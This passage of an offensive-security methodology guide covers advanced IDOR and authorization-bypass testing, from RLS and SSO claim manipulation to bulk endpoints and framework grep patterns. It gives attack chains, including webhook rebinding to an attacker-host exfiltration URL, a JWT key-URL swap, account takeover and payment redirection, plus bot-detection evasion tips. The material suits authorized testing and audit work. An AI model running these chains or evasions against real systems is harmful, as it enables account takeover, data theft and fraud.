- **Path-parameter parsing drift**: `/orders/1;jsessionid=x/download` — some middlewares parse `;` as a path parameter separator (per RFC 3986 matrix parameters), others as literal. If the auth middleware sees `orders/1` and the file server sees `orders/1;jsessionid=x/download`, the download may reach a different resource entirely.

### Transfer-Encoding and Body-Framing

- **`Transfer-Encoding: chunked` on writes**: some middlewares reject chunked bodies for auth-sensitive operations; the framework upstream accepts them. A middleware that gates on body-length but the framework parses chunked reveals a bypass.
- **Trailing headers**: after a chunked body, HTTP allows trailer headers. A middleware that reads only the request-line headers misses trailer values; the app that reads them after body parse sees additional identity claims. This is the trailer-header identity-injection primitive.
- **Content-Length vs Transfer-Encoding disagreement**: request smuggling territory — load `http_request_smuggling` for the primitive. The IDOR angle: a smuggled second request can inherit the front-end's authenticated context but hit the back-end with a foreign ID.

### Content Encoding

- **`Accept-Encoding: identity`** bypasses gzip-transform layers that some caches use as an implicit boundary. A CDN that compresses on the fly may strip Authorization from cache keys for compressed variants but not for identity variants — probe both.
- **`Accept: */*` vs specific**: content-type negotiation may route to different handlers; a `/api/orders/{id}` with `Accept: text/csv` may reach an exporter path that skips per-row authorization.

## Database-Level RLS and Query-Scoping Bypass

Row-level security is a defense-in-depth against IDOR when the app-layer scoping is bypassed. RLS itself is a set of primitives that can be attacked or leveraged:

### Postgres RLS

- **`SET SESSION AUTHORIZATION` reset**: RLS filters read a session-variable (`current_setting('app.current_user')`) set by the connection pool. If the pool recycles connections without clearing the session variable, a subsequent request under a different user may inherit the previous variable's value — reading rows scoped to the previous user.
- **GUC drift across pooled connections**: the same shape expressed via app-side custom GUCs (`SET app.tenant = 't1'`) — a pooled connection that recycles without clearing `app.tenant` keeps the previous tenant's value; the next request under a different tenant reads the previous tenant's rows. Prepared-statement cache compounds this: `pg_prepared_statements` under a shared session accumulate statements planned against the GUC value at prepare time; a `SET app.tenant` change does not re-plan the cached statements, so the prior tenant's filter persists in the plan.
- **Superuser role escape**: RLS is bypassed by default for role-level `BYPASSRLS`. A code path that acquires a superuser connection (migrations, admin scripts, background workers) reads without filtering. Probe by inducing the app to run a query through that path (feature-flag toggle, admin refresh, cache-rebuild) and observing whether the response contains cross-tenant rows.
- **View-based RLS bypass**: materialized views over RLS-scoped tables often refresh under the owner's role, embedding all rows in the view regardless of the caller. Queries against the view then leak cross-tenant.
- **Function-level SECURITY DEFINER**: PL/pgSQL functions marked `SECURITY DEFINER` execute under their owner's role, bypassing RLS on the underlying tables. An app that calls such a function passing a caller-supplied ID reaches all rows. Enumerate `pg_proc` for `SECURITY DEFINER` functions and check what the app calls them with.
- **`pg_read_server_files` / `COPY FROM PROGRAM`**: escalation surfaces at the DB layer, not IDOR primitives themselves; load `sql_injection` for the DB-side primitive.

### MySQL / MariaDB

- MySQL lacks native RLS; scoping is app-layer. The failure mode is unfiltered queries — grep for `LIMIT` without a `WHERE tenant_id = ?` clause.

### MongoDB

- Document-level scoping via `$match` at query start; a pipeline that skips the initial match reads all documents. Grep for `aggregate([...])` pipelines missing the tenant match.
- Cursor-based pagination that includes the next-page cursor across users — a cursor from a peer's query lets you page into their results.

### ORM Escape Hatches

- **Raw-SQL execution**: any code path that invokes raw SQL bypasses ORM-layer scoping. Grep for `db.session.execute()`, `Model.execute_raw()`, `ActiveRecord::Base.connection.execute()`, `Prisma.$queryRaw`, `Doctrine\DBAL::executeQuery()`. Each is a potential IDOR sink.
- **Query-builder `.raw()` clauses**: Django's `Manager.raw()`, Laravel's `DB::raw()`, SQLAlchemy's `text()` — bypass scoping.
- **`WHERE`-clause interpolation**: any endpoint that composes a WHERE clause from user input is both an SQLi surface (load `sql_injection`) and, at minimum, an IDOR surface if the WHERE lacks the tenant filter.

## Streaming-Response IDOR

Streaming responses (SSE, WebSocket bulk pushes, chunked JSON, gRPC server-streaming) each may skip per-message authorization.

### Server-Sent Events (SSE)

- SSE endpoints (`Content-Type: text/event-stream`) push events over a long-lived HTTP connection. If the auth check runs at connection open but each event's content is decided by the emitter, an admin-emitted event may leak into a lower-privilege subscriber's stream.
- Probe: open the SSE stream, observe every event emitted, and identify events whose content references foreign objects (a payment-completed event for user B in user A's stream).

### Chunked JSON / NDJSON

- `Content-Type: application/x-ndjson` streams a document per line. An exporter that streams all documents matching a query, applying the tenant filter to the query but not to each document, may leak cross-tenant when the query's filter is bypassed.
- Bulk-list endpoints that stream: watch for the first N documents to be your own, then subsequent to be foreign — a pagination-cursor race can inject a foreign cursor mid-stream.

### gRPC Streaming

- **Server-streaming**: server sends multiple messages after a single request. If authorization is checked at RPC open and each message is filtered per-message, per-message authorization drift may leak.
- **Bidirectional-streaming**: authorization at open + per-request-message check; per-response-message emission decided by the server. If the emitter doesn't filter based on the caller, cross-message drift is disclosure.
- Probe: open a stream, send a probe message that should elicit a broad response, observe whether the emitted stream contains cross-tenant data.

## HATEOAS and API-Shape Enumeration

REST-shaped APIs that embed hypermedia links (HAL, JSON-API, Siren, OpenAPI's `links`) advertise their object graph in the response. This is IDOR reconnaissance:

- **`_links` field**: HAL responses include `_links` mapping named relations to URIs. `_links.next` may include foreign IDs; `_links.parent` may reveal the parent's ID; `_links.owner.href` may leak the owner's URI even when the object body does not include an ownerId field.
- **`included` field (JSON-API)**: compound documents include related resources — a response for your order may include the owner's `email` under `included` because the owner-relation was expanded server-side without authorization on the included data.
- **`meta` and `debug` fields**: some APIs include a `meta` object with cursor/total-count/last-modified-by fields. `meta.total_count` on a filtered query reveals the count of matching objects regardless of whether the caller can read them.
- **Traversal-driven enumeration**: given a returned `_links.next`, follow it; if it returns another user's page, IDOR.

## Adversarial Timing Analysis

Base-file timing is coarse. Advanced timing:

- **Statistical timing separation**: for each ID in a probe set, fire N (10-100) requests, record response times, compute distribution. Two distributions with non-overlapping IQRs are distinguishable; use Mann-Whitney U or Kolmogorov-Smirnov to test at p<0.01.
- **Cross-endpoint amplification**: two endpoints that share an auth path but differ in DB access — the timing differential between them isolates the DB step. If a foreign ID reaches the DB (adds ~10ms) versus rejects at auth (~1ms), the amplified timing distinguishes 404-because-nonexistent from 404-because-unauthorized.
- **Cache-timing**: a hit on shared cache is measurably faster than a cache miss. If your first request to a foreign ID is fast, that ID was cached by someone else's earlier request — existence disclosure of the ID space via cache warmness.
- **DNS-timing sidechannels**: for services that perform DNS lookups on identifiers (rare — CNAME-based tenant routing), DNS-time correlates with identifier existence.

## Anti-Automation Countermeasures — Probing Around Them

- **CAPTCHA-in-the-loop**: authz probes hit rate limits that trigger CAPTCHA. Use headless browsers with residential-IP rotation only where the engagement authorizes it; otherwise, model the CAPTCHA appearance as a probe rate signal and slow accordingly.
- **Device fingerprinting**: browser fingerprint (`navigator.userAgent`, `screen.width`, WebGL, audio) — probes from a single fingerprint at scale look automated. Vary the fingerprint per probe batch.
- **JavaScript challenge (Cloudflare-style)**: an interstitial JS challenge blocks non-browser clients. Solve once, extract the resulting cookie, replay for subsequent probes within the cookie's TTL.
- **Behavioral analytics**: some WAFs profile the "shape" of a session (path traversal, mouse-move telemetry). For headless probes, injecting synthetic mouse-move events via the DevTools protocol reduces the anomaly score.
- **Progressive throttling under anomaly**: some apps escalate probes' latency and eventually fail them. Detect by monitoring per-probe latency; if the trend is monotonic increase, back off before hard-fail.

## Non-JSON Payload Formats

The base file mentions content-type toggling. Advanced non-JSON:

### XML

- **XML deserializers with entity expansion**: XML endpoints on legacy or SOAP APIs may resolve XXE, exposing internal object references. Load `xxe` for the primitive; IDOR angle: an XXE that reaches an internal admin API's object endpoint effectively performs an authenticated fetch under the internal service identity.
- **XML `id` attribute drift**: `<user id="1"/>` in XML has attribute semantics distinct from element content; a schema that maps attribute-id to the ORM key while the app displays element-content-as-name is a target-swap surface.

### Protobuf / gRPC-Web

- **`grpc-web-text` encoding**: gRPC-web wraps protobuf in a base64-length-prefixed frame. Middleware that authorizes on the outer HTTP layer but not the inner protobuf message may see a request that carries a foreign identifier in an unauthorized field.
- **Unknown fields**: protobuf preserves unknown fields silently. A message with an unknown field the middleware does not know to strip may reach the backend, which reads it via reflection. Probe by adding unknown numeric field tags.

### GraphQL Body-vs-URL Params

- Some GraphQL endpoints accept queries via both `POST` body and `GET` `?query=...`. The middleware may parse one differently — a persisted-query hash in GET might not authorize the same as a query-text in POST.

### Form-Encoded

- Form-encoded bodies (`application/x-www-form-urlencoded`) parse differently from JSON. `user_id=1&user_id=2` — PHP takes the last; Node's `qs` takes the last by default but supports a `strictNullHandling` mode that changes it; Java Spring's `WebRequest` gives you the array. Send the parameter twice with contradictory values and probe.

## Session and Token Handling — IDOR Adjacent

- **Session-token reuse across users**: a session store that keys by cookie value; if two users somehow acquire the same cookie value (via cache confusion, load balancer hash collision, or a bug in cookie generation), one user's session applies to the other's requests.
- **Refresh-token IDOR**: `POST /auth/refresh` with a foreign refresh-token — if refresh-tokens are enumerable or leaked, this is direct account takeover. The IDOR angle: refresh-tokens *are* identifiers.
- **API-key IDOR**: `GET /api-keys/{id}` returns the key value under an IDOR — the key is now the primitive for all subsequent probes as that user.
- **OAuth-token exchange**: token exchange endpoints often accept a subject-token and return an actor-token for a scope; if the exchange endpoint doesn't check that the subject-token was issued to the caller, IDOR-shape token forgery.

## Cross-Origin Considerations for Browser-Delivered IDOR

- **CORS-permissive endpoints**: an endpoint with `Access-Control-Allow-Origin: *` and `Access-Control-Allow-Credentials: true` is readable by any origin's JS with the caller's credentials. Combined with a Chained Disclosure primitive (a URL that leaks IDs), a malicious page reads the leak cross-origin.
- **`Timing-Allow-Origin: *`**: exposes precise timing to cross-origin script. Timing-based IDOR probes can now run from the victim's browser.
- **`postMessage` receivers**: an app iframe that receives postMessage with an object reference and re-fetches under caller cookies is cross-origin IDOR.

## Federated Identity and SSO — IDOR Adjacent

Enterprise SSO stacks (SAML, OIDC, OAuth 2.x) express identity through assertions or tokens; each carries claims the app may parse for authorization. IDOR at the identity layer is per-claim manipulation:

### SAML Assertion IDOR

- **NameID substitution**: SAML `<NameID>` typically carries the user's principal identifier. An SP that reads NameID but does not verify the assertion's signature (or accepts a self-signed assertion under a laxly configured IdP trust) can be forged to any NameID — full impersonation as an IDOR-shape.
- **AttributeStatement injection**: extra `<Attribute>` elements in the assertion. If the SP consumes `email`, `role`, `orgId` from the assertion without a schema check, injected attributes reach the SP's session model.
- **XSW (XML Signature Wrapping)**: rearranging signed and unsigned elements in the assertion to keep the signature valid on the original nodes while presenting attacker-controlled duplicates elsewhere. Load `xxe` for the XML primitive; the IDOR angle is that XSW effectively becomes NameID/attribute substitution.

### OIDC / OAuth 2.x Claim Manipulation

- **`sub` claim substitution**: the `sub` claim in an ID token identifies the user. An app that trusts a token's `sub` without verifying the token's `iss` and `aud` matches expectations can be tricked by a token from a different IdP or a different application within the same IdP.
- **`kid` header confusion**: the JWT `kid` header names the signing key. If the app fetches JWK from a URL derivable from `kid` (JWKS auto-discovery), a `kid: http://attacker.tld/jwks.json` fetches the attacker's key. The finding is JWT-side but the impact is IDOR — every subsequent request under the forged token accesses foreign objects. Load `authentication_jwt` for the primitive.
- **`groups` claim injection**: OIDC often includes a `groups` claim listing memberships. An app that reads `groups` for object authorization ("is user in `orders-admins`?") without validating the claim came from the trusted IdP is vulnerable to injection at the token layer.
- **Delegated-token IDOR**: on-behalf-of and impersonation grants (RFC 8693 Token Exchange) accept a subject-token and issue an actor-token. If the exchange endpoint doesn't verify the subject-token belongs to the caller, IDOR-shape forgery.

### Multi-IdP Trust Boundaries

- **Multiple IdPs, single SP**: an SP that trusts IdPs `A` and `B` (both for different tenants) may see a NameID collision — user `alice@x.com` at IdP A and `alice@x.com` at IdP B collapse to the same account. Which IdP the assertion came from is the deciding factor; probe by re-authenticating via the "wrong" IdP.
- **Federation with attribute mapping**: `groups` from IdP A and `roles` from IdP B may both populate the same authorization slot. A claim collision (attacker-controlled at one IdP overrides the other) is the finding.

## Notification Systems — IDOR Surface

Notification pipelines carry two IDOR shapes: **delivery-time dereference** (server renders foreign references under service identity) and **channel subscription** (per-user or per-channel authorization at connect/subscribe time). Both must be tested.

### Delivery-Time Reference Resolution

Async delivery pipelines (email, push notification, SMS, webhook) run under service identity and dereference object references at delivery time. Any pipeline that resolves a foreign reference at delivery is an IDOR-adjacent surface:

- **Email template interpolation**: a template with `{{order.customer.email}}` resolves at render. Store a foreign `customer_id` on your order (via Object Rebinding), and the confirmation email delivers foreign customer PII to your inbox.
- **Push-notification payload**: push payloads sometimes include the target's name, avatar, or context; a subscription binding drift means notifications intended for user B arrive at user A's device.
- **SMS templates**: same shape as email; SMS is often plain-text and unencrypted, so any interpolation IDOR is directly readable in transit if intercepted.
- **Webhook delivery**: a webhook fires with the resource's content in the body. Rebind the webhook target to attacker infrastructure, and every subsequent event delivers the resource content to the attacker.
- **File attachment resolution**: an emailed attachment resolved from `{{invoice.file_key}}` — if the file_key points at a foreign S3 object, the email carries that object as an attachment. Load `mass_assignment` for the write-side of storing the foreign key.

The probe: (i) find a template/pipeline that interpolates foreign-referenced content; (ii) inject the reference via a normal-looking mutation; (iii) trigger the pipeline (send the email, invoke the notification, replay the webhook); (iv) observe delivery.

### Channel-Subscription IDOR

Distinct from delivery-time, the subscribe/join primitive itself is authorization-tested. WebSocket coverage is in the base file; the broader channel surface:

- **Server-Sent Events per-user channels**: `/events?user=<foreign>` — many SSE implementations bind the stream to a URL query parameter without validating against the authenticated caller.
- **GraphQL subscriptions**: `subscription { orderUpdates(userId: <foreign>) { ... } }` — subscription resolvers frequently trust the argument.
- **MQTT / STOMP / AMQP**: broker-based messaging. Subscribing to `topic/user/{foreign}/notifications` — brokers with wildcard trust let cross-user subscription succeed. Test topic ACLs, not just broker auth.
- **Slack/Discord-style outgoing webhooks**: webhook URLs stored per-user; enumeration reads the webhook URL, then either invokes it (delivering forged content into the victim's channel) or replaces it via IDOR-shape update.
- **Email digest opt-in**: `POST /notifications/subscribe` with a `user_id` field — subscribes the attacker's email to receive the target user's notifications.
- **Per-message emit filter**: even when subscribe-time auth is correct, per-message emission may leak — a broadcast to all subscribers of a "public" channel that emits per-subscriber-specific content is a filter-side leak.

## Legacy and Refactor-Era IDOR

Apps evolve; the authorization model changes over time. Old endpoints that predate the current authorization architecture often remain live:

- **Endpoint versioning drift**: `/api/v1/orders/{id}` and `/api/v2/orders/{id}` may share the handler but the v1 route bypasses new middleware (rate limit, tenant isolation, role check). Grep the router config for `v1`, `legacy`, `deprecated` prefixes; test each surviving endpoint against the current authz expectations.
- **Migration endpoints**: `/api/migrate`, `/admin/reindex`, `/internal/rebuild` — endpoints added during a data migration that were meant to be temporary but stayed. These frequently run under service identity and accept object IDs from any caller.
- **Shadowed routes**: a router that defines `GET /orders/{id}` and elsewhere `GET /orders/*` (catch-all) — the catch-all may skip parameterized-route middleware.
- **HTTP-method extensions**: an app that added authorization for GET but not for TRACE, PROPFIND, MKCOL (WebDAV-adjacent). Legacy web servers may still respond to these.
- **`.php`/`.asp` extension shadows**: `orders/1` reaches the modern handler; `orders/1.php` reaches an ancient one. Similarly `.asp`, `.jsp`, `.action` (Struts), `.do`. Test the exact extension the framework recognizes.

## Test-Environment and Staging Cross-Contamination

- **Staging pointing at prod DB**: a common misconfiguration where a staging env's read-replica points at production. Probes to staging read production data.
- **Feature-flag preview environments**: preview environments per-branch (Vercel, Netlify, Heroku Review Apps) may inherit staging or production data with different authz middleware. The preview URL leaks in PRs; the URL is public.
- **Debug/preview headers on staging**: `X-Debug: 1`, `X-Preview-User: <id>` — a staging environment that honors these on prod-like data is a per-request identity override.
- **API version pinning to old branch**: `X-Api-Version: 20220101` reaches the app's compat path for that date; older middleware code executes.

## Rate-Limit Drift and Per-User Budgets

Rate limiting can be an oracle:

- **Per-user quotas keyed by identity**: a lookup against a foreign ID that increments the target's rate-limit counter (rather than yours) confirms existence because the counter increments even on "denied" responses.
- **Retry-After differentials**: a 429 with `Retry-After: 60` for a foreign ID versus `Retry-After: 1` for owned — the difference reveals the target's quota tier.
- **Distributed-rate-limiter shard collision**: rate limiters hashed by user-ID or IP that collide on shard keys — one user's high-rate blocks another user's requests. Circumstantially proves user separation is not correctly implemented.

## Response-Body Sanitization Drift

- **Server-side field filtering by role**: the app returns different fields for admin vs non-admin. If the filter is applied at serialization but the DB fetch includes all fields, a bug in the filter may leak. Test by requesting fields via GraphQL projections or JSON-API `fields` params that were "restricted" for your role.
- **`fields[X]=...` API-JSON parameters**: JSON-API's `fields[users]=email,secret` — if the server honors the request but doesn't enforce role-specific field allowlists, you read fields your UI never shows.
- **Include-parameter expansion abuse**: `?include=owner,payments,notes` — each included relation may have its own auth. If the top-level object is scoped to you but included relations skip re-authorization, cross-included data leaks.

## Chaining Depth

Beyond base-file chains, advanced compositions. The general shape:

- **IDOR + XSS (stored, cross-user)**: an IDOR write into a foreign user's `bio` or `custom_status` field with an XSS payload executes in that user's DOM the next time they load the profile. The XSS runs under the victim's session — full account takeover from an IDOR-write plus XSS execution.
- **IDOR + JWT (secret-material read)**: an IDOR that reads a user's active session record (including the signing key or a rotation seed) grants token-forgery capability. Load `authentication_jwt` for the forgery half.
- **IDOR + SSRF (webhook)**: rebinding a webhook target to attacker infrastructure exfiltrates every subsequent event body of the target resource. Chain: rebind + wait + observe.
- **IDOR + Path Traversal**: an IDOR on file-storage keys may reach paths outside the tenant's expected prefix. Combine with signed-URL manipulation for cross-tenant download.
- **IDOR + Race**: mutate the object's owner between the ownership check and the mutation dispatch — the mutation lands under the wrong owner.
- **IDOR + BFLA + Multi-Tenant**: reach an admin action under a lower role in a foreign tenant — three primitives combined. Load `broken_function_level_authorization` and `authentication_jwt`.
- **IDOR + Cache**: cache-poisoning stores your response into shared cache under a foreign cache key; subsequent legitimate requests serve your content. This is dual-write IDOR-in-cache.

Each hop's precondition must independently hold — the chain is not automatic. Confirm each step with its own signal before claiming the composition.

### Worked End-to-End Examples

Each is a real-shape multi-step composition; specific product/version names are for illustration.

#### Chain A: Chained Disclosure → Direct Object Reference → Password Reset → Account Takeover

1. **Preconditions**: attacker has a valid but low-privilege account.
2. `GET /api/notifications` under attacker returns notification payloads that include a `resetTokenId` field for password-reset events fired *for other users*. (Chained Disclosure — the notification service is a broadcast facility rather than per-user filtered.)
3. Parse `resetTokenId` values; enumerate.
4. `GET /api/password-resets/{resetTokenId}` under attacker returns the reset token itself. (Direct Object Reference on a security-critical object.)
5. `POST /api/password-resets/{resetTokenId}/complete` with `{"new_password":"..."}`. Session is now the victim's.
6. **Postcondition**: attacker holds valid session as any user whose reset flow crossed the notification broadcast.

The finding compounds — each individual step is a finding; the chain shows the escalation path from a benign-looking notification API to full account takeover.

#### Chain B: Enumeration + Object Rebinding → Cross-Tenant Data Exfiltration

1. **Preconditions**: attacker has a workspace/tenant they control.
2. `POST /api/webhooks` creates a webhook under attacker's tenant; response includes `"id": 12345`. Sequential integer confirmed enumerable.
3. `PATCH /api/webhooks/12346` (attacker's own +1 walk starting point) — probe reveals response shape for foreign webhooks.
4. `PATCH /api/webhooks/{foreign-id}` with `{"callback_url": "https://attacker.tld/exfil", "tenant_id": "<victim-tenant>"}`. Rebinds the webhook target to attacker-controlled infrastructure.
5. Wait for events. Every event in the victim tenant now delivers to attacker's server.
6. **Postcondition**: durable exfiltration of every event stream in the victim tenant until the webhook is rotated.

#### Chain C: Tenant Isolation + BFLA + IDOR = Full Cross-Tenant Admin

1. **Preconditions**: attacker has a valid low-privilege account in tenant A.
2. `GET /admin/tenants/tenant-B/users` under attacker's token with `X-Tenant-ID: tenant-B` — the admin endpoint is gated only by the tenant selector, not the role. Returns tenant B's user list. (BFLA — `broken_function_level_authorization`.)
3. `POST /admin/tenants/tenant-B/impersonate/{userId}` — impersonate any user in tenant B. (BFLA + IDOR-shape target ID.)
4. Session is now `userId` in tenant B, obtained without any credentials in tenant B.
5. **Postcondition**: attacker has admin-privileged sessions in every tenant reachable via the tenant selector primitive.

#### Chain D: Workflow-Context + Object Rebinding = Payment Redirection

1. **Preconditions**: attacker has a valid low-privilege account and access to the app's payment flow.
2. `POST /api/payouts/initiate` under attacker with `{"amount": 1000, "recipient_account_id": <attacker>}`. Response includes `intentId`.
3. `PATCH /api/payouts/{intentId}` under attacker with `{"recipient_account_id": <victim-account>}`. The intent object is owned by attacker; mutating its recipient is permitted at object-level. (Workflow-Context — the recipient is decided at intent time.)
4. `POST /api/payouts/{intentId}/execute`. The execute endpoint reads the intent's recipient field rather than the caller's account. Payment moves to victim.
5. **Postcondition**: money moved. Reversibility depends on the app's compensating controls.

#### Chain E: Search-Result Leakage → IDOR on Sensitive Object

1. **Preconditions**: attacker has a valid account.
2. `GET /api/search?q=confidential` under attacker returns results across the entire index (search not tenant-scoped). Results include object IDs.
3. `GET /api/documents/{leaked-id}` under attacker. If the document endpoint has an IDOR (Direct Object Reference), read is possible.
4. If not: `GET /api/documents/{leaked-id}?include=meta` — the meta include may include a scoped rendering that lacks the base-endpoint's authz check.
5. **Postcondition**: cross-user document read.

Each chain requires per-hop confirmation. A tempting mistake is to prove step 2 and declare the chain — the postcondition of the final hop is what matters. If step 4 fails, the chain terminates; step 3's finding is still valid on its own.

## Batch and Bulk Endpoints

Bulk operations are a persistent IDOR reservoir because per-request authz frequently checks the caller's identity once, then iterates items without re-authorizing each:

### Homogeneous-Array Probes

- **Mixed-tenant array**: `POST /orders/bulk-update` with `[{"id": <mine>, "status": "cancelled"}, {"id": <foreign>, "status": "cancelled"}]`. The handler that reads `caller_id` from the token once and applies it to all rows fails per-row scoping.
- **First-item authz pattern**: some handlers authorize the first item and assume the rest are the same tenant. Include foreign IDs in positions 2..N.
- **Skip-invalid-continue pattern**: handlers that skip items failing auth and continue silently rarely log or return per-item errors — probe by observing whether the response summary claims N successes while only N-1 were owned.

### Heterogeneous-Payload Probes

- **Mixed-action array**: `[{"action":"read","id":<foreign>},{"action":"delete","id":<mine>}]` — the action-level dispatch may authorize based on the last action while executing all. Some handlers use the action of the first item for authz.
- **Nested-batch escape**: `{"batch":[{"batch":[...]}]}` — a batch inside a batch may hit different code paths than a flat batch.

### Import/Export Endpoints

- **CSV import with foreign FKs**: uploading `owner_id,name\n<foreign>,x` to `POST /imports/customers` — the importer resolves the `owner_id`. If it does so under service identity, the foreign customer's owner is now written by the attacker.
- **JSON import**: nested JSON with foreign references, especially those describing an object graph — the graph traversal frequently reaches objects the caller couldn't fetch individually.
- **Zip-of-CSVs**: some importers accept archive uploads where each file is imported as a separate table; per-file authorization may be inconsistent.

### GraphQL Bulk-Mutation

- **Multi-mutation single-request**: `mutation { a: delete(id:<mine>) { id } b: delete(id:<foreign>) { id } }`. Each mutation's resolver runs; if the resolver's authz check is asymmetric or fails-open on error, `b` succeeds.
- **Array-input mutations**: `mutation Delete($ids: [ID!]!) { delete(ids: $ids) { count } }` with an array containing foreign IDs. The resolver often iterates without per-ID authz.

## Sound Signal Enumeration Under Modern Defenses

- **Response hashing**: for a foreign ID, if the response body is identical across many probes (empty envelope, generic error) the endpoint is enforcing consistently. If the response body varies subtly (byte counts, ETag prefix, JSON key ordering), that variance is a signal.
- **Structural byte-count analysis**: measure response Content-Length across a range of probe IDs. Discrete clusters in the distribution suggest distinct response categories (owned, foreign-exists, foreign-nonexistent, error). Cluster boundaries are oracles.
- **Header-set fingerprinting**: capture the full response header set for each probe. Any header that varies per-resource is an oracle (`ETag`, `Last-Modified`, `X-Object-Id`, custom `X-*`).
- **Serialization-order variance**: JSON responses with map-ordered keys may reflect internal storage order. Compare key order between owned and probe responses.
- **Rate-limit budget consumption**: some rate limiters decrement only on "real" requests; a foreign ID that decrements your budget was processed (existence); one that doesn't was rejected before dispatch.

## Detection Heuristics — Advanced

Base-file Detection Signals covers first-order signals. Advanced pattern recognition:

- **The `caller_id`-derived-from-request pattern in code**: grep the codebase for `owner_id = request.data.get('owner_id')` or similar shapes where the object's owner is read from the request body. Every such pattern is an Object Rebinding candidate.
- **The absent-scope-in-manager pattern**: for Django/Rails managers, grep for `.objects.filter(pk=id)` (versus `.for_user(user).filter(pk=id)`); each is an IDOR sink candidate.
- **The token-only-auth-decorator pattern**: `@requires_auth` decorators without a role or scope argument — auth-only, no authz — flag every such endpoint for two-account probing.
- **The `internal=true` query-param pattern**: endpoints with a `?internal=true` toggle that skips authz; often left in for debugging.
- **The `debug`, `preview`, `impersonate` query-param family**: any of these frequently bypasses authz.
- **`.raw()`, `.execute()`, `.query()` sinks**: raw-SQL and query-builder escape hatches; each candidate for missing scoping.

## Tooling — Advanced Modes

- **Autorize interceptor rules**: beyond the standard `Bypassed!`/`Enforced` labels, configure interception filters to skip static/CSS/JS paths and to include only 200-response scope items. The signal density improves markedly. Additionally: use Autorize's regex-based "Interception Filters (Scope items)" to exclude any endpoint returning a public asset by URL pattern; the noise floor drops enough that the `Is enforced???` bucket becomes tractable.
- **AuthMatrix DSL**: define per-endpoint expected access as a matrix; the tool flags any deviation. Better than Autorize for role-heavy apps where the expected matrix has structure. Persist the matrix across sessions with `Save/Load matrix` to build a durable authz baseline.
- **Custom two-account harness**: build a `hurl`/`python` harness that (i) captures ground truth under owner identity, (ii) fires attacker probe, (iii) diffs status + identifier + body-excerpt vs ground truth. The three-clause diff is the differentiator over scanner heuristics.
- **Turbo Intruder for race probing**: Burp's Turbo Intruder supports single-request-with-many-concurrent-copies via `first-byte sync`. Use it for the TOCTOU race primitive; the `engine=Engine.THREADED, concurrentConnections=8, gate='race1'` pattern releases N held requests simultaneously for a controlled race window.
- **Frida for mobile-app authz introspection**: hook the app's token-usage sites to observe how identity flows through the app. Sometimes surfaces client-side token modifications the network intercept misses — `Interceptor.attach(Module.findExportByName(null, 'SSL_write'), { onEnter: … })` captures the raw request bytes before TLS.
- **PostgreSQL RLS validation**: for apps with DB-level RLS, connect directly to the DB with a token-derived role and confirm the RLS filter is present. A missing filter is the finding regardless of what the app returns.
- **`nuclei` templated authz probes**: nuclei templates can express two-account differentials via variable substitution. Useful for scaling a specific probe class across a large target catalog.
- **HTTP-mock replay tools (`mitmproxy`, `bettercap`)**: capture-and-replay tools that support scripted request mutations. `mitmproxy`'s scripting API is ideal for the "capture owner ground truth, replay under attacker" pattern.
- **`grep`/`ripgrep` for source review**: `rg -A 3 'objects\.get\(pk=|\.find\(|findByPk|findUnique|Order::find'` returns the ORM-lookup sinks. Cross-reference with the auth middleware map to identify unscoped lookups.
- **Semgrep for pattern-based audit**: patterns like `objects.get(pk=$X)` in Django or `$MODEL.find($ID)` in Rails, without a scope-append in the same expression, can be detected by static rule. Custom Semgrep rules per framework improve throughput.

## Reporting and Evidence

- **Per-finding minimum evidence**: (a) two request/response pairs — owner ground truth and attacker probe; (b) the three-clause predicate result; (c) the specific family (from base-file taxonomy) and the identifier-locus (path param, body field, header); (d) a proposed fix at the mechanism level (add per-object scope to the ORM lookup, or wire an object-permission check into the resolver).
- **Chain-finding evidence**: per-hop request/response pairs, plus a directed graph of the chain naming each hop's precondition and postcondition. The chain is only as strong as its weakest hop's confirmation.
- **Impact quantification**: for enumeration-driven findings (Direct Object Reference over integer IDs), the impact is the size of the enumerable range at time of probe. State it: "≥N objects enumerable via the ±1 walk from a captured owner ID," not "many."
- **Non-repudiation of findings**: for engagements requiring a court-defensible chain of custody, timestamp probes via signed logs; retain the exact request bytes (not just the reconstructed shape). This is out of the IDOR-primitive concern but affects reporting.

## False Positives — Advanced

The base file lists common false-positive shapes. Advanced discipline:

- **Auto-scoping without disclosure**: the app returns a 200 with the caller's own resource when a foreign ID is requested. Not a finding by itself, but a design smell — probe adjacent endpoints under the same shape for the "real" IDOR that may lie behind it.
- **Idempotency-key confusion**: an idempotency-key header that echoes back the previous response for the same key. If the previous response was foreign, the echo is disclosure — but the primitive is idempotency-key reuse, not IDOR proper.
- **Time-based leakage without content**: an endpoint returns 200 with `X-Last-Modified: <past-timestamp>` for a foreign ID that existed at that time — an existence oracle, but not a content leak. Categorize as existence disclosure.
- **API-versioned differential**: `/api/v1/orders/{id}` shows IDOR, `/api/v2/orders/{id}` does not. The v2 fix is the finding for v1 — report v1 as vulnerable, not v2 as sound.
- **Cross-user cache warmup**: repeated foreign-ID requests hitting cache in the same TTL window may show timing convergence that looks like content matching. Reset caches (or wait past TTL) before confirming timing findings.

## Fingerprinting Auth Middleware by Framework

Framework-specific patterns to grep for when auditing a codebase, each of which produces a distinct IDOR shape:

### Django / DRF

- `permission_classes = [IsAuthenticated]` on a view — auth-only, no per-object authz. Every such view is a candidate.
- `get_queryset(self)` overrides — if the override doesn't filter by `self.request.user`, the queryset returns all objects.
- `get_object(self)` overrides — same shape; a `get_object` that returns `Model.objects.get(pk=self.kwargs['pk'])` without filtering is direct IDOR.
- `permission_classes = [IsOwnerOrReadOnly]` custom permission — check the permission's `has_object_permission` implementation; a common bug is comparing `obj.owner_id == request.user.id` for objects where the ownership field is named differently.
- **Django Ninja / FastAPI decorators**: `Depends(get_current_user)` — auth-only unless combined with per-object logic.

### Ruby on Rails

- `before_action :authenticate_user!` — auth-only.
- `Order.find(params[:id])` in controllers — no scope; IDOR.
- `current_user.orders.find(params[:id])` — scoped correctly.
- `Pundit`, `CanCanCan`, `Rolify` policy classes — the policy's `show?`/`update?` methods must return `false` for foreign objects; check each.
- **Strong Params over-permitting**: `params.permit(:owner_id, ...)` in a controller — treats owner_id as writeable from the request body. Object Rebinding candidate.

### Node / Express / Nest

- `router.get('/orders/:id', authMiddleware, ...)` — auth-only.
- Prisma `prisma.order.findUnique({ where: { id } })` without a caller-derived filter — IDOR.
- Sequelize `Order.findByPk(id)` without scope — IDOR.
- **Nest guards without object-check**: `@UseGuards(AuthGuard)` — auth-only.
- **CASL / accesscontrol**: policy libraries; check each rule's shape and applicability.

### Java / Spring

- `@PreAuthorize("isAuthenticated()")` — auth-only.
- `@PreAuthorize("hasRole('X')")` — role-only, no per-object.
